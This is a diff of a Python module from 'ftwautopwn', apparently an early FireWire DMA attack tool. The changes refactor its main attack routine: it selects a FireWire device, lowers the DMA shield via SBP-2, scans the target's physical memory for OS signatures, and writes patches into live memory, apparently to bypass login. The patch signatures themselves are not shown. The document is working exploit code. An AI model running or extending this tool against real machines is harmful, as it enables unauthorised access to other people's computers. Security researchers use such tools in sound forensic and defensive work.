@@ -1,16 +1,17 @@
 '''
 Created on Jun 23, 2011
 
-@author: carmaa
+@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
 '''
 from binascii import hexlify
 from forensic1394 import Bus
 from ftwautopwn.util import msg, clean_hex, MemoryFile, fail, findmemsize,\
-    bytelen, int2binhex
-from time import sleep
+    bytelen, int2binhex, separator
 
 import sys
 import ftwautopwn.settings as settings
+import time
+from ftwautopwn.firewire import FireWire
 
 
 def select_target(targets, selected=False):
@@ -36,6 +37,7 @@ def printdetails(target):
     Prints details about a target
     '''
     msg('*', 'The attack contains the following signatures:')
+    separator()
     print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
     print('\tArchitectures:\t' + ', '.join(target['architectures']).rstrip(', '))
     for signature in target['signatures']:
@@ -62,33 +64,8 @@ def printdetails(target):
         print('\t\tPatch:\t\t{0:#x}'.format(patch))
         print('\t\tPatch offset:\t{0:#x}'.format(poffs))
         
-    print()
-
-def initfw():
-    '''
-    Initializes FireWire and waits for SBP-2
-    '''
-    b = Bus()
-    # TODO: Check that we are connected and can see a FW unit directory
-    # TODO: Use businfo method here, start timing and reduce the delay below based
-    # on how long time the user use to select a device
-    # TODO: Drop enabling SBP-2 if target is OS X
-    # Enable SBP-2 support to ensure we get DMA
-    b.enable_sbp2()
-    try:
-        for i in range(settings.fw_delay, 0, -1):
-            sys.stdout.write('[*] Initializing bus and enabling SBP-2, please wait %2d seconds or press Ctrl+C\r' % i)
-            sys.stdout.flush()
-            sleep(1)
-    except KeyboardInterrupt:
-        msg('!', 'Interrupted')
-        pass
-    # TODO: Make sure that we actually have devices, plus error checking 
-    # Open the first device for now
-    d = b.devices()[0]
-    d.open()
-    print() # Create a newline so that next call to print() will start on a new line
-    return d
+    separator()
+    
 
 def siglen(l):
     '''
@@ -215,6 +192,9 @@ def searchanddestroy(device, target, memsize):
         print()
         fail('I/O Error, make sure FireWire interfaces are properly '\
                  'connected.')
+    except KeyboardInterrupt:
+        print()
+        raise KeyboardInterrupt
     
     # If we get here, we haven't found anything :-/
     print()    
@@ -224,40 +204,45 @@ def attack(targets):
     '''
     Main attack logic
     '''
-    # TODO: Detect targets
+    # Initialize and lower DMA shield
+    if not settings.filemode:
+        fw = FireWire()
+        start = time.time()
+        device_index = fw.select_device()
+        # Print selection
+        msg('*', 'Selected device: ' + fw.vendors[device_index])
 
-    # If not detected, list targets
+    # List targets
+    msg('*', 'Available targets (from settings.py):')
+    separator()
     for number, target in enumerate(targets, 1):
                 msg(number, target['OS'] + ': ' + target['name'])
-                
+    separator()
+       
     # Select target
     target = select_target(targets)
     
     # Print selection. If verbose, print selection with signatures
     msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
     if settings.verbose:
-        #msg('*', 'The attack contains the following signatures:')
         printdetails(target)
-        # TODO: Create a pretty print method that can print this in a fashionable way
-        #pprint(target['signatures'])
-        #print()
-        
-        
-    # Initialize and lower DMA shield
+    
+    # Lower DMA shield or use a file as input
     device = None
     if settings.filemode:
         device = MemoryFile(settings.filename, settings.PAGESIZE)
     else:
-        device = initfw()
-        
-    # TODO: Check that we have DMA (use isStale())
+        elapsed = int(time.time() - start)
+        device = fw.getdevice(device_index, elapsed)
+
     # Determine memory size and set to default if not found
     memsize = findmemsize(device)
     if not memsize:
         # TODO: Create a select() method that can cope with defaults
-        cont = input('[-] Could not determine memory size: DMA shield may still be up. Try increasing the\n'\
-                     '    delay after enabling SBP2 (-d switch). Do you want to continue and use the FireWire\n'\
-                     '    maximum addressable limit (4 GiB) as memory size? [y/N]:')
+        cont = input('''\
+[-] Could not determine memory size: DMA shield may still be up. Try increasing
+    the delay after enabling SBP2 (-d switch). Do you want to continue and use
+    the FireWire maximum addressable limit (4 GiB) as memory size? [y/N]: ''')
         if cont in ['y', 'Y']:
             memsize = settings.memsize
         else:
@@ -269,11 +254,11 @@ def attack(targets):
     msg('*', 'Attacking...')
     address, chunks = searchanddestroy(device, target, memsize)
     if not address:
-        # TODO: Sequential search
+        # TODO: Fall-back sequential search?
         fail('Could not locate signature(s).')
     
     # Signature found, let's patch
-    mask = 0xfffff000 # Mask away the lower bytes to find the page number
+    mask = 0xfffff000 # Mask away the lower bits to find the page number
     page = int((address & mask) / settings.PAGESIZE)
     msg('+', 'Signature found at {0:#x} (@page # {1}).'.format(address, page))
     if not settings.dry_run:
@@ -282,4 +267,7 @@ def attack(targets):
             msg('+', 'Write-back verified; patching successful.')
         else:
             msg('-', 'Write-back could not be verified; patching unsuccessful.')
+    
+    #Clean up
+    device.close()
     
